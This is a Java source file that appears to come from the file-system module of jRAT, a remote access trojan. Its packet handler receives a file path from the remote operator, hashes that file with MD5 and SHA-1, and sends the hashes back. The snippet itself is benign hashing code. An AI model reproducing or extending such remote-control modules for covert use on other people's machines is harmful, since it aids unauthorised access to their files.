package jrat.module.fs.packets;

import jrat.client.packets.incoming.AbstractIncomingPacket;
import jrat.common.hash.Md5;
import jrat.common.hash.Sha1;
import jrat.client.Connection;

import java.io.File;


public class Packet64FileHash extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String path = con.readLine();

		File file = new File(path);
		
		Sha1 sha1 = new Sha1();
		Md5 md5 = new Md5();

		String smd5 = md5.hash(file);
		String ssha1 = sha1.hash(file);

		System.gc();

		con.addToSendQueue(new Packet46FileHash(smd5, ssha1));
	}

}
